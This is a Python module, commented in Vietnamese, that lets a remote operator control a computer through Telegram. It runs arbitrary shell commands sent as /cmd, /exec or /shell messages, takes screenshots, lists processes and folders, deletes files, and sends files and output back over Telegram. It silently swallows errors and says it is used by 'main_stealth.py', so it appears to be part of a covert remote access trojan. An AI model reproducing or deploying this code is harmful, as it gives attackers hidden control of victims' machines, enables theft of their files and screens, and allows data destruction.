"""
Module điều khiển từ xa qua Telegram
Nhận lệnh từ Telegram và thực thi trên máy tính
"""
import os
import sys
import subprocess
import shutil
from datetime import datetime


class RemoteControl:
    def __init__(self, telegram_bot, chat_id, machine_id):
        """
        Khởi tạo remote control
        
        Args:
            telegram_bot: Telegram bot instance
            chat_id: Chat ID để nhận lệnh
            machine_id: Machine ID để nhận diện
        """
        self.bot = telegram_bot
        self.chat_id = chat_id
        self.machine_id = machine_id
        self.command_history = []
    
    async def check_commands(self):
        """Kiểm tra lệnh mới từ Telegram"""
        try:
            if not self.bot:
                return
            
            # Lấy tin nhắn mới nhất
            updates = await self.bot.get_updates(limit=10)
            
            for update in updates:
                if not update.message:
                    continue
                
                message = update.message
                text = message.text
                
                # Chỉ xử lý lệnh có format: /cmd MACHINE_ID command
                if text and text.startswith('/cmd'):
                    parts = text.split(' ', 2)
                    if len(parts) >= 3:
                        target_id = parts[1]
                        command = parts[2]
                        
                        # Kiểm tra xem lệnh có dành cho máy này không
                        if target_id == self.machine_id or target_id == self.machine_id[-8:]:
                            result = self.execute_command(command)
                            await self.send_result(result, command)
                
                # Lệnh đơn giản hơn: /exec MACHINE_ID command
                elif text and text.startswith('/exec'):
                    parts = text.split(' ', 2)
                    if len(parts) >= 3:
                        target_id = parts[1]
                        command = parts[2]
                        
                        if target_id == self.machine_id or target_id == self.machine_id[-8:]:
                            result = self.execute_command(command)
                            await self.send_result(result, command)
                
                # Lệnh shell: /shell MACHINE_ID command
                elif text and text.startswith('/shell'):
                    parts = text.split(' ', 2)
                    if len(parts) >= 3:
                        target_id = parts[1]
                        command = parts[2]
                        
                        if target_id == self.machine_id or target_id == self.machine_id[-8:]:
                            result = self.execute_shell(command)
                            await self.send_result(result, command)
        
        except Exception:
            pass
    
    def execute_command(self, command):
        """
        Thực thi lệnh
        
        Args:
            command: Lệnh cần thực thi
        
        Returns:
            dict: Kết quả thực thi
        """
        try:
            # Phân tích lệnh
            cmd_lower = command.lower().strip()
            
            # Lệnh đặc biệt
            if cmd_lower == 'screenshot':
                return self.take_screenshot()
            elif cmd_lower == 'info':
                return self.get_system_info()
            elif cmd_lower == 'processes':
                return self.get_processes()
            elif cmd_lower.startswith('download '):
                file_path = command[9:].strip()
                return self.download_file(file_path)
            elif cmd_lower.startswith('delete '):
                file_path = command[7:].strip()
                return self.delete_file(file_path)
            elif cmd_lower.startswith('list '):
                dir_path = command[5:].strip()
                return self.list_directory(dir_path)
            else:
                # Thực thi lệnh shell
                return self.execute_shell(command)
        
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': command
            }
    
    def execute_shell(self, command):
        """Thực thi lệnh shell"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='ignore'
            )
            
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed (no output)"
            
            return {
                'success': result.returncode == 0,
                'output': output[:2000],  # Giới hạn 2000 ký tự
                'command': command,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': "Command timeout (30s)",
                'command': command
            }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': command
            }
    
    def take_screenshot(self):
        """Chụp ảnh màn hình"""
        try:
            from screenshot_capture import ScreenshotCapture
            capture = ScreenshotCapture()
            screenshot_path = capture.capture_and_compress(quality=80)
            
            if screenshot_path:
                return {
                    'success': True,
                    'output': f"Screenshot saved: {screenshot_path}",
                    'file': screenshot_path,
                    'command': 'screenshot'
                }
            else:
                return {
                    'success': False,
                    'output': "Failed to take screenshot",
                    'command': 'screenshot'
                }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': 'screenshot'
            }
    
    def get_system_info(self):
        """Lấy thông tin hệ thống"""
        try:
            import psutil
            import platform
            
            info = f"🖥️ System Info\n"
            info += f"Machine ID: {self.machine_id}\n"
            info += f"Hostname: {platform.node()}\n"
            info += f"OS: {platform.system()} {platform.release()}\n"
            info += f"CPU: {psutil.cpu_count()} cores, {psutil.cpu_percent()}% usage\n"
            info += f"RAM: {psutil.virtual_memory().percent}% used\n"
            
            return {
                'success': True,
                'output': info,
                'command': 'info'
            }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': 'info'
            }
    
    def get_processes(self):
        """Lấy danh sách process"""
        try:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'memory_mb': round(proc.info['memory_info'].rss / (1024 * 1024), 2)
                    })
                except:
                    pass
            
            # Sắp xếp theo memory
            processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            
            output = "📊 Top Processes:\n"
            for i, proc in enumerate(processes[:10], 1):
                output += f"{i}. {proc['name']} (PID: {proc['pid']}) - {proc['memory_mb']} MB\n"
            
            return {
                'success': True,
                'output': output,
                'command': 'processes'
            }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': 'processes'
            }
    
    def download_file(self, file_path):
        """Tải file và gửi về Telegram"""
        try:
            if os.path.exists(file_path):
                return {
                    'success': True,
                    'output': f"File found: {file_path}",
                    'file': file_path,
                    'command': f'download {file_path}'
                }
            else:
                return {
                    'success': False,
                    'output': f"File not found: {file_path}",
                    'command': f'download {file_path}'
                }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': f'download {file_path}'
            }
    
    def delete_file(self, file_path):
        """Xóa file"""
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                return {
                    'success': True,
                    'output': f"File deleted: {file_path}",
                    'command': f'delete {file_path}'
                }
            else:
                return {
                    'success': False,
                    'output': f"File not found: {file_path}",
                    'command': f'delete {file_path}'
                }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': f'delete {file_path}'
            }
    
    def list_directory(self, dir_path):
        """Liệt kê thư mục"""
        try:
            if not os.path.exists(dir_path):
                return {
                    'success': False,
                    'output': f"Directory not found: {dir_path}",
                    'command': f'list {dir_path}'
                }
            
            files = []
            for item in os.listdir(dir_path):
                item_path = os.path.join(dir_path, item)
                if os.path.isfile(item_path):
                    size = os.path.getsize(item_path)
                    files.append(f"📄 {item} ({size} bytes)")
                elif os.path.isdir(item_path):
                    files.append(f"📁 {item}/")
            
            output = f"📂 Directory: {dir_path}\n\n"
            output += '\n'.join(files[:50])  # Giới hạn 50 items
            
            return {
                'success': True,
                'output': output,
                'command': f'list {dir_path}'
            }
        except Exception as e:
            return {
                'success': False,
                'output': f"Error: {str(e)}",
                'command': f'list {dir_path}'
            }
    
    async def send_result(self, result, command):
        """Gửi kết quả về Telegram"""
        try:
            from telegram_sender import TelegramSender
            sender = TelegramSender()
            
            message = f"🖥️ Machine: {self.machine_id}\n"
            message += f"⚡ Command: {command}\n"
            message += f"✅ Status: {'Success' if result['success'] else 'Failed'}\n"
            message += f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            message += f"📋 Output:\n{result['output']}"
            
            await sender.send_text(message)
            
            # Nếu có file, gửi file
            if 'file' in result and result['file']:
                await sender.send_file(result['file'], caption=f"File from command: {command}")
        
        except Exception:
            pass


if __name__ == "__main__":
    print("Remote Control Module")
    print("Sử dụng trong main_stealth.py")

